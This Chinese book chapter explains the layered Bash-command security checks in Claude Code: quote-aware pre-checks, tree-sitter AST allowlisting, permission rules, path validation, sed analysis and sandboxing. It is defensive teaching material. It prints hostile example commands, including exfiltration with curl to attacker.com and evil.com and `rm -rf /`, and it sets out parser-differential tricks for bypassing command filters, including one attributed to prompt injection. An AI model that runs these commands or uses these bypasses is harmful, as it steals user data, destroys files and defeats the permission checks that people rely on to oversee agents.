+++
date = '2026-06-09T00:00:00+08:00'
draft = false
title = "第11章：安全深度防御算法"
tags = ["AI Agent", "Claude Code", "算法思想", "安全防御", "沙箱"]
categories = ["AI Agent", "Claude Code"]
weight = 13
+++
> "安全系统的可靠性不取决于最强的那道防线，而取决于所有防线的协同深度。"

## 11.1 问题引入：当 AI 获得 Shell 权限

想象这样一个场景：你让 Claude Code 帮你"清理项目中的临时文件"，它生成了一条 Bash 命令准备执行。这条命令可能是无害的 `find . -name '*.tmp' -delete`，也可能被恶意提示注入篡改为 `rm -rf / --no-preserve-root`。更隐蔽地，攻击者可能构造 `find . -name '*.tmp' -exec curl attacker.com -d @/etc/passwd \;` 这样的命令——表面上在查找文件，实际上在窃取敏感数据。

这就是 AI Agent 安全的核心挑战：**Agent 必须拥有足够的系统权限才能有用，但不受约束的权限又会成为巨大的安全隐患**。Claude Code 对此给出了一个工程上极其精密的回答——一套超过 630KB 源码、覆盖 20 余种安全检查维度的深度防御体系。

本章将深入解析这套安全体系的算法设计。我们将看到，它不是一个简单的"黑名单过滤器"，而是一个多层级、多维度、失败即关闭（fail-closed）的安全架构，其中每一层都假设上一层可能被绕过。

## 11.2 架构总览：多层过滤漏斗

Claude Code 的 Bash 安全体系可以用一个**多层过滤漏斗**来描述。每一条命令从进入到执行，需要依次通过以下安全层：

```
用户/模型生成的命令
         │
         ▼
┌─────────────────────────┐
│  第1层：预解析安全检查    │  ← bashSecurity.ts（约20个验证器）
│  控制字符、Unicode攻击、  │    检测注入、混淆、命令替换等
│  命令替换、重定向、换行…  │
└─────────┬───────────────┘
          │ passthrough / ask / allow
          ▼
┌─────────────────────────┐
│  第2层：AST 结构化分析    │  ← ast.ts（tree-sitter 解析）
│  解析为 SimpleCommand[]  │    提取 argv、环境变量、重定向
│  节点类型白名单过滤      │    未知节点 → too-complex → ask
└─────────┬───────────────┘
          │ simple / too-complex / parse-unavailable
          ▼
┌─────────────────────────┐
│  第3层：权限规则匹配      │  ← bashPermissions.ts
│  deny / ask / allow 规则  │    前缀匹配、通配符匹配
│  环境变量剥离 + 包装器剥离│    固定点迭代去除伪装层
└─────────┬───────────────┘
          │ deny / ask / allow
          ▼
┌─────────────────────────┐
│  第4层：只读性验证        │  ← readOnlyValidation.ts
│  命令白名单 + 标志位验证  │    确保命令仅做读取操作
│  危险标志拒绝列表         │
└─────────┬───────────────┘
          │ allow / ask
          ▼
┌─────────────────────────┐
│  第5层：路径约束验证      │  ← pathValidation.ts
│  工作目录边界检查         │    路径遍历攻击防护
│  危险路径检测             │    ~/.claude/ 等敏感路径保护
└─────────┬───────────────┘
          │ allow / ask / deny
          ▼
┌─────────────────────────┐
│  第6层：特殊命令处理      │  ← sedValidation.ts 等
│  sed/awk 等可执行命令     │    表达式级安全分析
│  jq system() 检测        │
└─────────┬───────────────┘
          │ allow / ask
          ▼
┌─────────────────────────┐
│  第7层：沙盒隔离          │  ← shouldUseSandbox.ts
│  文件系统 / 网络限制      │    最后一道物理隔离
└─────────┬───────────────┘
          │
          ▼
       命令执行
```

**核心设计原则：失败即关闭（Fail-Closed）**。在任何一层中，如果分析器无法确定命令是安全的，就默认拒绝（返回 `ask` 要求用户确认）。这与"失败即开放"形成鲜明对比——后者假设无法判断时命令是安全的，这在安全系统中是致命的。

## 11.3 第一道防线：命令字符串的静态分析

### 11.3.1 算法概述

在进入 AST 解析之前，`bashSecurity.ts` 首先对命令字符串进行一系列"预飞检查"。这些检查针对的是**解析器差异攻击**——利用我们的安全分析器与真实 Bash 解释器之间的解析差异来绕过安全检查。

源码定义了约 20 个独立的验证器（validator），每个验证器返回三种结果之一：

- **`allow`**：命令已被证明安全，可以跳过后续检查
- **`ask`**：检测到危险模式，必须请求用户确认
- **`passthrough`**：本验证器未发现问题，传递给下一个验证器

```typescript
// 伪代码：验证器链的核心执行逻辑
function bashCommandIsSafe(command: string): PermissionResult {
  const context = buildValidationContext(command);

  // 早期允许路径：空命令、安全的 heredoc、简单的 git commit
  for (const earlyValidator of EARLY_VALIDATORS) {
    const result = earlyValidator(context);
    if (result.behavior !== 'passthrough') return result;
  }

  // 主验证链：任何一个返回 ask 就中断
  for (const validator of MAIN_VALIDATORS) {
    const result = validator(context);
    if (result.behavior === 'ask') return result;
  }

  return { behavior: 'passthrough' };
}
```

### 11.3.2 引号感知的内容提取

安全检查的第一步是理解命令中哪些内容在引号内（安全的数据），哪些在引号外（可能是危险的 shell 操作符）。`extractQuotedContent` 函数用一个状态机追踪单引号、双引号和转义状态：

```typescript
// 伪代码：引号感知的内容提取
function extractQuotedContent(command: string): QuoteExtraction {
  let withDoubleQuotes = '';     // 保留双引号内容，去除单引号内容
  let fullyUnquoted = '';        // 去除所有引号内容
  let inSingleQuote = false;
  let inDoubleQuote = false;
  let escaped = false;

  for (const char of command) {
    if (escaped) { escaped = false; /* 保留到相应输出 */ continue; }
    if (char === '\\' && !inSingleQuote) { escaped = true; continue; }
    if (char === "'" && !inDoubleQuote) { inSingleQuote = !inSingleQuote; continue; }
    if (char === '"' && !inSingleQuote) { inDoubleQuote = !inDoubleQuote; continue; }

    if (!inSingleQuote) withDoubleQuotes += char;
    if (!inSingleQuote && !inDoubleQuote) fullyUnquoted += char;
  }
  return { withDoubleQuotes, fullyUnquoted };
}
```

这个提取的结果会被后续多个验证器使用。例如，检测重定向符号 `>` 时，只需要在 `fullyUnquoted`（完全去引号的内容）中查找，因为引号内的 `>` 只是普通字符。

接着，`stripSafeRedirections` 会从提取结果中移除已知安全的重定向模式（如 `2>&1`、`> /dev/null`），避免这些常见模式触发误报。这里有一个精妙的安全细节：**每个模式的正则表达式末尾都必须有尾随边界断言 `(?=\s|$)`**。源码注释详细解释了原因——如果没有这个断言，`> /dev/nullo`（注意多了个字母 o）会被错误地匹配为 `> /dev/null`，导致尾部的 `o` 被遗留，而真正的文件写入操作逃过了检测。

### 11.3.3 注入检测：20 个维度的攻击面覆盖

以下是主要验证器及其防御的攻击类型：

**1. 命令替换检测（`validateDangerousPatterns`）**

这是最关键的检查之一。攻击者常用 `$()` 或反引号 `` ` `` 在看似无害的命令中嵌入恶意子命令。检测模式涵盖：

```typescript
const COMMAND_SUBSTITUTION_PATTERNS = [
  { pattern: /<\(/,  message: 'process substitution <()' },
  { pattern: />\(/,  message: 'process substitution >()' },
  { pattern: /=\(/,  message: 'Zsh process substitution =()' },
  { pattern: /\$\(/, message: '$() command substitution' },
  { pattern: /\$\{/, message: '${} parameter substitution' },
  { pattern: /\$\[/, message: '$[] legacy arithmetic expansion' },
  // Zsh 特有的危险模式
  { pattern: /(?:^|[\s;&|])=[a-zA-Z_]/, message: 'Zsh equals expansion (=cmd)' },
  { pattern: /~\[/,  message: 'Zsh-style parameter expansion' },
  // 防御性：即使我们不在 PowerShell 中执行，也阻止其注释语法
  { pattern: /<#/,   message: 'PowerShell comment syntax' },
];
```

对于反引号，系统使用专门的 `hasUnescapedChar` 函数来区分转义的反引号（安全）和未转义的（危险）：

```typescript
// 区分 \`safe\` （转义的）和 `dangerous`（未转义的）
function hasUnescapedChar(content: string, char: string): boolean {
  let i = 0;
  while (i < content.length) {
    if (content[i] === '\\' && i + 1 < content.length) {
      i += 2; // 跳过反斜杠和被转义的字符
      continue;
    }
    if (content[i] === char) return true; // 发现未转义的字符
    i++;
  }
  return false;
}
```

**2. 标志位混淆检测（`validateObfuscatedFlags`）**

这是一个极其精密的验证器，对抗的是通过 shell 引号机制隐藏危险标志位的攻击。例如：

- `find . -name '*.tmp' "-exec" rm {} \;` — 将 `-exec` 藏在引号中
- `jq $'-f' evil_script` — 使用 ANSI-C 引号编码
- `"""-f"` — 利用多层空引号串联绕过检测

源码中对这类攻击的防御层层递进：

```typescript
// 第1层：阻止 ANSI-C 引号 $'...'（可编码任意字符）
if (/\$'[^']*'/.test(originalCommand)) return { behavior: 'ask', ... };

// 第2层：阻止 locale 引号 $"..."
if (/\$"[^"]*"/.test(originalCommand)) return { behavior: 'ask', ... };

// 第3层：阻止空引号后跟破折号（如 ''-exec, ""-f）
if (/(?:^|\s)(?:''|"")+\s*-/.test(originalCommand)) return { behavior: 'ask', ... };

// 第4层：阻止同类空引号对紧跟引号中的破折号（如 """-f"）
if (/(?:""|'')+['"]-/.test(originalCommand)) return { behavior: 'ask', ... };

// 第5层：阻止连续3个以上引号（更广泛的安全网）
if (/(?:^|\s)['"]{3,}/.test(originalCommand)) return { behavior: 'ask', ... };

// 第6层：逐字符状态机扫描引号内的标志位模式
// ... （约200行的精确引号状态追踪代码）
```

源码注释中引用了具体的 HackerOne 报告编号，说明每一层防御都是对真实攻击向量的响应。

**3. 换行注入与回车注入（`validateNewlines` + `validateCarriageReturn`）**

换行符可以在 Bash 中分隔命令。更微妙的是**回车符 `\r` 的解析器差异攻击**：源码中有一段精彩的分析——JavaScript 的 `\s` 匹配 `\r`，但 Bash 的默认 IFS 不包含 `\r`。这意味着安全分析器和 Bash 对 `\r` 的理解不同：

```
攻击：TZ=UTC\recho curl evil.com  配合规则 Bash(echo:*)

分析器看到：shell-quote 将 \r 视为分隔符
  → 分词为 ['TZ=UTC', 'echo', 'curl', 'evil.com']
  → 剥离 TZ=UTC → 'echo curl evil.com' 匹配 Bash(echo:*) → 允许

Bash 实际执行：\r 不是 IFS 字符
  → 分词为 ['TZ=UTC\recho', 'curl', 'evil.com']
  → TZ=UTC\recho 是环境变量赋值，curl 才是真正执行的命令
  → 执行 curl evil.com → 数据泄露！
```

这正是"解析器差异攻击"的典型例子，Claude Code 用独立的验证器来专门防御它。

**4. Zsh 特有的危险命令检测（`validateZshDangerousCommands`）**

由于 Claude Code 可能在 Zsh 环境下运行，它维护了一个 Zsh 特有的危险命令集合：

```typescript
const ZSH_DANGEROUS_COMMANDS = new Set([
  'zmodload',   // 加载任意 Zsh 模块（文件 I/O、网络、伪终端）
  'emulate',    // 带 -c 标志是 eval 等价物
  'sysopen',    // 精细控制的文件打开
  'syswrite',   // 文件描述符写入
  'ztcp',       // TCP 连接（可用于数据窃取）
  'zf_rm',      // 内建 rm（绕过二进制检查）
  // ... 更多
]);
```

**5. IFS 注入和 `/proc/environ` 访问检测**

```typescript
// IFS 变量可用于绕过正则验证
if (/\$IFS|\$\{[^}]*IFS/.test(originalCommand)) {
  return { behavior: 'ask', message: 'IFS variable usage detected' };
}

// /proc/*/environ 可暴露 API 密钥等敏感环境变量
if (/\/proc\/.*\/environ/.test(originalCommand)) {
  return { behavior: 'ask', message: '/proc/environ access detected' };
}
```

## 11.4 第二道防线：AST 结构化分析

### 11.4.1 从字符串到语法树

字符串层面的检查虽然有效，但存在根本局限——它无法可靠地理解命令的结构语义。`ast.ts` 使用 tree-sitter（一个增量解析库）将命令字符串解析为抽象语法树（AST），从而获得精确的结构信息。

```typescript
export type ParseForSecurityResult =
  | { kind: 'simple'; commands: SimpleCommand[] }   // 成功解析
  | { kind: 'too-complex'; reason: string }          // 无法安全分析
  | { kind: 'parse-unavailable' }                    // 解析器不可用

export type SimpleCommand = {
  argv: string[];                    // argv[0] 是命令名
  envVars: { name: string; value: string }[];  // 前置环境变量
  redirects: Redirect[];            // 重定向
  text: string;                     // 原始文本
};
```

### 11.4.2 白名单优先的节点遍历

AST 分析的核心安全属性是**白名单遍历**：只有显式列入白名单的节点类型才会被处理，任何未知节点类型都被视为 `too-complex`。

```typescript
// 允许递归遍历的结构节点
const STRUCTURAL_TYPES = new Set([
  'program', 'list', 'pipeline', 'redirected_statement'
]);

// 已知的危险节点类型
const DANGEROUS_TYPES = new Set([
  'command_substitution', 'process_substitution', 'expansion',
  'subshell', 'function_definition', 'ansi_c_string', ...
]);

function collectCommands(node, commands, varScope) {
  if (node.type === 'command') return walkCommand(node, ...);
  if (STRUCTURAL_TYPES.has(node.type)) { /* 递归子节点 */ }
  // 关键：任何不在白名单中的节点
  return tooComplex(node); // → 要求用户确认
}
```

这种设计的优雅之处在于：**即使 tree-sitter 的未来版本引入了我们不认识的新节点类型，系统也会自动将其视为不安全**。安全性不依赖于穷举所有危险类型，而是依赖于穷举所有安全类型。

### 11.4.3 变量作用域追踪

AST 分析还实现了一个精巧的变量作用域追踪系统。当命令中出现 `VAR=value && cmd $VAR` 模式时，分析器需要知道 `$VAR` 的值来判断安全性：

```typescript
function collectCommands(node, commands, varScope: Map<string, string>) {
  // 遇到变量赋值 VAR=value → 记录到 varScope
  // 遇到 $VAR → 从 varScope 查找值
  // 遇到 $() → 替换为 __CMDSUB_OUTPUT__ 占位符

  // 关键安全属性：作用域隔离
  if (node.type === 'pipeline') {
    // 管道各阶段在子 shell 中运行 → 变量不泄漏
    scope = new Map(varScope); // 拷贝而非共享
  }
  if (child.type === '||' || child.type === '|' || child.type === '&') {
    // 条件分支 / 后台任务中设置的变量可能未执行
    scope = new Map(snapshot); // 重置到分支前的快照
  }
}
```

这个设计防止了一类微妙的攻击：

```bash
# 攻击：利用条件分支的变量泄漏
true || FLAG=--dry-run && cmd $FLAG
# Bash 实际执行：|| 右侧不执行，FLAG 未设置，cmd 无参数运行
# 如果分析器线性传递作用域：FLAG=--dry-run 被记录，argv=['cmd','--dry-run']
# → 看起来安全但实际上 cmd 在无 --dry-run 保护下运行
```

### 11.4.4 预检查：解析器差异防护

在交给 tree-sitter 之前，`parseForSecurityFromAst` 函数先执行一组预检查，专门防御 tree-sitter 和 Bash 之间的解析差异：

```typescript
export function parseForSecurityFromAst(cmd, root): ParseForSecurityResult {
  // 控制字符：tree-sitter 和 bash 对 \r 等字符的分词不一致
  if (CONTROL_CHAR_RE.test(cmd)) return { kind: 'too-complex', ... };

  // Unicode 空白：终端不可见但 bash 视为普通字符
  if (UNICODE_WHITESPACE_RE.test(cmd)) return { kind: 'too-complex', ... };

  // 反斜杠空白：tree-sitter 保留原始文本，bash 去除反斜杠
  if (BACKSLASH_WHITESPACE_RE.test(cmd)) return { kind: 'too-complex', ... };

  // Zsh 特有扩展
  if (ZSH_TILDE_BRACKET_RE.test(cmd)) return { kind: 'too-complex', ... };
  if (ZSH_EQUALS_EXPANSION_RE.test(cmd)) return { kind: 'too-complex', ... };

  // 花括号与引号的组合（混淆花括号展开）
  if (BRACE_WITH_QUOTE_RE.test(maskBracesInQuotedContexts(cmd)))
    return { kind: 'too-complex', ... };

  // 解析器超时（可被对抗性输入触发）
  if (root === PARSE_ABORTED)
    return { kind: 'too-complex', reason: 'Parser aborted — possible adversarial input' };

  return walkProgram(root);
}
```

其中 `maskBracesInQuotedContexts` 函数尤其精巧——它用一个状态机将引号内的 `{` 替换为空格，这样 JSON 有效载荷（如 `curl -d '{"key":"value"}'`）就不会误触花括号展开检测，而真正的混淆攻击（如 `{a'}',b}`）仍然会被捕获。

## 11.5 第三道防线：权限规则匹配

### 11.5.1 三级权限体系

`bashPermissions.ts` 实现了 deny > ask > allow 的三级优先级权限体系。用户可以配置类似以下的规则：

```
Bash(rm:*)          → deny   # 永远阻止 rm
Bash(git commit:*)  → allow  # 自动允许 git commit
Bash(curl:*)        → ask    # 每次询问 curl
```

### 11.5.2 环境变量与包装器剥离

攻击者可能用环境变量或包装器命令来伪装真实命令：

```bash
FOO=bar rm -rf /           # 用环境变量前缀伪装
timeout 10 rm -rf /         # 用 timeout 包装
nohup FOO=bar timeout 5 rm -rf /  # 多层嵌套
```

`stripSafeWrappers` 函数通过**两阶段固定点迭代**来处理这些情况：

```typescript
function stripSafeWrappers(command: string): string {
  let stripped = command;
  // 阶段1：剥离安全的环境变量（仅限白名单中的变量名）
  while (变化) {
    剥离注释行;
    if (匹配安全环境变量模式) 剥离环境变量;
  }
  // 阶段2：剥离安全的包装器命令
  while (变化) {
    剥离注释行;
    for (pattern of [timeout, time, nice, nohup]) {
      剥离匹配的包装器;
    }
  }
  return stripped;
}
```

**关键安全细节**：两阶段是刻意分开的。在阶段 2 中不再剥离环境变量，因为包装器命令用 `execvp` 执行参数——`nohup FOO=bar cmd` 中的 `FOO=bar` 不是环境变量赋值而是被执行的"命令"。如果在阶段 2 中继续剥离环境变量，就会产生解析差异。

对于 deny 规则，系统使用更激进的 `stripAllLeadingEnvVars`（剥离所有环境变量而非仅白名单中的），因为 deny 规则必须更难绕过：

```typescript
// Allow 规则：只剥离安全环境变量（防止 DOCKER_HOST=evil docker ps 匹配 docker:*）
// Deny 规则：剥离所有环境变量（防止 FOO=bar rm 绕过 rm 的 deny 规则）
```

### 11.5.3 复合命令的安全处理

前缀规则（如 `Bash(cd:*)` ）不能匹配复合命令（如 `cd /tmp && python3 evil.py`），否则攻击者可以将任意命令附加在被允许的命令之后。系统通过 `splitCommand` 将复合命令拆分为子命令后逐一检查：

```typescript
// 安全：阻止前缀规则匹配复合命令
if (isCompoundCommand.get(cmdToMatch)) {
  return false; // Bash(cd:*) 不匹配 "cd /tmp && rm -rf /"
}
```

## 11.6 第四道防线：只读性验证与路径约束

### 11.6.1 命令白名单与标志位验证

`readOnlyValidation.ts` 维护了一个详尽的命令配置表，定义每个命令的安全标志位：

```typescript
const COMMAND_ALLOWLIST: Record<string, CommandConfig> = {
  xargs: {
    safeFlags: {
      '-I': '{}',        // 替换字符串
      '-n': 'number',    // 每次传递参数数量
      '-P': 'number',    // 并行度
      '-0': 'none',      // null 分隔
      // 注意：-i 和 -e 被刻意排除！（见下方说明）
    },
  },
  sed: {
    safeFlags: { '-n': 'none', '-E': 'none', '-r': 'none', ... },
    additionalCommandIsDangerousCallback: (cmd) =>
      !sedCommandIsAllowedByAllowlist(cmd),
  },
  // ... 数十个命令的配置
};
```

源码中对 xargs 的 `-i` 和 `-e` 排除有一段极其详细的安全分析：这两个标志使用 GNU getopt 的"可选附着参数"语义（`i::`），参数必须直接附在标志后面（如 `-iX`），空格分隔（`-i X`）会让 X 变成下一个位置参数（即要执行的目标命令）。这种解析差异可被利用来执行任意命令。

### 11.6.2 路径遍历防护

`pathValidation.ts` 对命令中的所有文件路径进行验证，防止访问工作目录之外的文件：

```typescript
function checkPathConstraints(command, paths): PermissionResult {
  for (const path of paths) {
    const absolutePath = resolve(cwd, expandTilde(path));

    // 检查是否在允许的工作目录内
    if (!pathInAllowedWorkingPath(absolutePath)) {
      return { behavior: 'ask', message: `Path outside working directory: ${absolutePath}` };
    }

    // 检查是否是 Claude 配置文件（永远不允许修改）
    if (isClaudeConfigFilePath(absolutePath) && operationType === 'write') {
      return { behavior: 'deny', message: 'Cannot modify Claude config files' };
    }

    // 检查危险的删除路径
    if (command === 'rm' && isDangerousRemovalPath(absolutePath)) {
      return { behavior: 'ask', message: `Dangerous rm target: ${absolutePath}` };
    }
  }
}
```

路径提取器针对每种命令类型都有专门的实现。以 `find` 命令为例，它需要区分搜索路径、谓词参数和标志：

```typescript
find: (args) => {
  const paths = [];
  let afterDoubleDash = false;

  for (const arg of args) {
    if (arg === '--') { afterDoubleDash = true; continue; }
    // -- 之后的所有参数都是路径（POSIX 语义）
    if (afterDoubleDash) { paths.push(arg); continue; }
    // 处理 -newer、-path 等带路径参数的标志
    if (pathFlags.has(arg)) { paths.push(nextArg); continue; }
    // 第一个非标志参数之前的参数是搜索路径
    if (!foundFlag && !arg.startsWith('-')) { paths.push(arg); }
  }
  return paths;
}
```

注意 `--` 的处理：`find -- -/../../etc` 中，`--` 使 `-/../../etc` 变成搜索路径而非标志，如果不处理 `--`，这个路径遍历攻击就会被漏过。

## 11.7 特殊命令的深度分析：以 sed 为例

`sed` 是安全分析中最具挑战性的命令之一，因为它既可以只读使用，也可以写入文件，甚至可以执行任意命令（通过 `e` 标志）。Claude Code 为它构建了一个完整的表达式级安全分析器。

### 11.7.1 双层安全模型

```typescript
function sedCommandIsAllowedByAllowlist(command, options): boolean {
  const expressions = extractSedExpressions(command);  // 提取 sed 表达式
  const hasFiles = hasFileArgs(command);                // 是否有文件参数

  // 白名单模式1：行打印命令（sed -n '1,5p'）
  const isPattern1 = isLinePrintingCommand(command, expressions);

  // 白名单模式2：替换命令（sed 's/old/new/g'）
  const isPattern2 = isSubstitutionCommand(command, expressions, hasFiles, options);

  if (!isPattern1 && !isPattern2) return false;

  // 纵深防御：即使白名单匹配，仍然检查黑名单
  for (const expr of expressions) {
    if (containsDangerousOperations(expr)) return false;
  }

  return true;
}
```

### 11.7.2 危险操作检测

`containsDangerousOperations` 函数是一个极其保守的检测器，它采用"宁可误报，不可漏报"的策略：

```typescript
function containsDangerousOperations(expression: string): boolean {
  // 拒绝非 ASCII 字符（Unicode 同形字攻击）
  if (/[^\x01-\x7F]/.test(cmd)) return true;

  // 拒绝花括号（块命令，太复杂无法安全分析）
  if (cmd.includes('{') || cmd.includes('}')) return true;

  // 拒绝换行（多行命令太复杂）
  if (cmd.includes('\n')) return true;

  // 检测写入命令：w filename, W filename
  if (/^[wW]\s*\S+/.test(cmd)) return true;
  if (/^\d+\s*[wW]\s*\S+/.test(cmd)) return true;
  if (/^\/[^/]*\/[IMim]*\s*[wW]\s*\S+/.test(cmd)) return true;

  // 检测执行命令：e [command]
  if (/^e/.test(cmd)) return true;
  if (/^\/[^/]*\/[IMim]*\s*e/.test(cmd)) return true;

  // 检测替换命令中的危险标志位
  const substitutionMatch = cmd.match(/s([^\\\n]).*?\1.*?\1(.*?)$/);
  if (substitutionMatch) {
    const flags = substitutionMatch[2];
    if (flags.includes('w') || flags.includes('e')) return true; // w=写文件, e=执行
  }

  return false;
}
```

### 11.7.3 BRE 到 ERE 的安全转换

`sedEditParser.ts` 实现了一个 BRE（基础正则）到 ERE（扩展正则）的安全转换算法。由于 sed 默认使用 BRE，而 JavaScript 使用 ERE，两者对特殊字符的转义规则正好相反：

```
BRE: \+ 表示 "一个或多个"，+ 是字面量
ERE: +  表示 "一个或多个"，\+ 是字面量
```

转换使用占位符技术来避免二次转义错误：

```typescript
if (!sedInfo.extendedRegex) {
  jsPattern = jsPattern
    .replace(/\\\\/g, BACKSLASH_PLACEHOLDER)     // 保护 \\
    .replace(/\\\+/g, PLUS_PLACEHOLDER)           // \+ → 占位符
    .replace(/\+/g, '\\+')                        // 字面量 + → 转义
    .replace(PLUS_PLACEHOLDER_RE, '+')             // 占位符 → ERE +
    .replace(BACKSLASH_PLACEHOLDER_RE, '\\\\');    // 恢复 \\
}
```

替换字符串中使用随机盐（`randomBytes(8)`）生成占位符来防止注入攻击——如果用户输入恰好包含占位符字符串，随机盐确保不会产生碰撞。

## 11.8 沙盒隔离策略

沙盒是最后一道物理防线。`shouldUseSandbox.ts` 的逻辑简洁而有原则：

```typescript
export function shouldUseSandbox(input): boolean {
  // 沙盒未启用 → 不使用
  if (!SandboxManager.isSandboxingEnabled()) return false;

  // 用户显式禁用且策略允许 → 不使用
  if (input.dangerouslyDisableSandbox &&
      SandboxManager.areUnsandboxedCommandsAllowed()) return false;

  // 命令在排除列表中 → 不使用（注意：这不是安全边界）
  if (containsExcludedCommand(input.command)) return false;

  // 默认：使用沙盒
  return true;
}
```

排除列表的检查也不简单——对于复合命令（如 `docker ps && curl evil.com`），系统会将其拆分为子命令逐一检查，防止攻击者将恶意命令附加在被排除的命令后面。

## 11.9 防御纵深模型总结

Claude Code 的安全体系体现了经典的**防御纵深**（Defense in Depth）思想，但在 AI Agent 场景下做了独特的适配：

| 防御层 | 功能 | 失败模式 | 下一层补救 |
|--------|------|----------|-----------|
| 字符串预检查 | 检测已知危险模式 | 新的编码技巧绕过正则 | AST 解析还原真实结构 |
| AST 结构分析 | 理解命令语义结构 | tree-sitter/bash 解析差异 | 预检查已处理已知差异 |
| 权限规则匹配 | 用户意图检查 | 规则配置不当 | 只读性验证兜底 |
| 只读性验证 | 确保无副作用 | 白名单遗漏 | 路径约束限制影响范围 |
| 路径约束 | 限制文件访问范围 | 符号链接等绕过 | 沙盒物理隔离 |
| 特殊命令分析 | sed/awk 等深度检查 | 表达式解析不完整 | 黑名单兜底检查 |
| 沙盒隔离 | 物理层面限制 | 沙盒逃逸 | 用户确认作为最终防线 |

每一层的设计都假设上面的层可能被绕过。这就是为什么即使白名单匹配成功，`sedCommandIsAllowedByAllowlist` 仍然要执行黑名单检查；为什么即使 AST 分析成功，路径验证仍然独立运行。

## 11.10 思考题

**思考题 1：解析器差异攻击的本质**

Claude Code 用了大量代码处理"解析器差异"问题（安全分析器与真实 Bash 对命令的理解不一致）。思考：如果直接使用 Bash 本身来解析命令（例如 `bash -n` 或 `bash --dump-po-strings`），能否从根本上消除这类问题？这种方案有什么权衡？

> 提示：考虑 Bash 解析的副作用（如 `PS4` 变量在 `-x` 模式下的展开）、Zsh vs Bash 的差异、以及"解析"与"理解语义"之间的鸿沟。tree-sitter 的优势在于它是纯粹的语法分析器，没有执行副作用。

**思考题 2：白名单 vs 黑名单的哲学**

在 `ast.ts` 中，Claude Code 选择了"白名单节点类型"策略而非"黑名单危险类型"策略。请论证这个选择的安全性优势，并思考它的代价——在 tree-sitter 更新支持新的 Bash 语法特性时，白名单策略会导致什么问题？如何在安全性和可用性之间找到平衡？

> 提示：思考 DANGEROUS_TYPES 集合的注释——"This set is not exhaustive...The real safety property is the allowlist"。白名单的核心优势是安全属性不依赖于穷举所有危险情况。

**思考题 3：设计一个新的安全验证器**

假设发现了一种新的攻击向量：利用 Bash 的 `{a,b}` 花括号展开来绕过命令名检查（例如 `{c,u,r,l} evil.com` 在 Bash 中等价于 `curl evil.com`）。请设计一个新的验证器来防御此攻击。需要考虑：（1）如何在不产生误报的情况下检测该模式？（2）应该放在验证器链的哪个位置？（3）如何处理引号内的合法花括号（如 JSON 数据）？

> 提示：参考 `ast.ts` 中 `BRACE_EXPANSION_RE` 和 `maskBracesInQuotedContexts` 的设计——前者检测花括号展开模式，后者用状态机屏蔽引号内的花括号来避免误报。实际上，Claude Code 已经在 AST 层面防御了这类攻击。

## 11.11 小结

本章深入剖析了 Claude Code 的安全深度防御体系。我们看到，保护一个能执行 Shell 命令的 AI Agent 远比简单的"关键词过滤"复杂——它需要理解 Shell 的引号语义、处理多种解析器之间的差异、追踪变量作用域的传播、分析特殊命令的表达式语义，并在多个层级上构建互相补偿的防御。

这套体系的几个核心设计哲学值得铭记：

1. **失败即关闭**：无法证明安全就视为危险。这贯穿在 `too-complex` 的默认行为、未知节点类型的处理、解析失败的兜底策略中。

2. **防御纵深**：每一层都假设上一层可能被绕过。白名单内还套黑名单，AST 分析前还有预检查，路径验证独立于权限规则运行。

3. **安全属性的构建性证明**：不是试图证明"不存在攻击"，而是构建性地证明"命令等价于这组 argv"。AST 的白名单遍历就是这种思想的体现——不需要知道所有攻击手段，只需要确保理解了命令的完整结构。

4. **实战驱动的演进**：源码中大量的安全注释引用了 HackerOne 报告编号和具体的攻击场景。每一条看似多余的检查背后都有一个真实的攻击向量。安全代码不是一次性设计的产物，而是在攻防对抗中持续演化的结果。

在下一章中，我们将转向性能优化的话题——看看 Claude Code 如何在保持这种深度安全检查的同时，维持快速的响应速度。
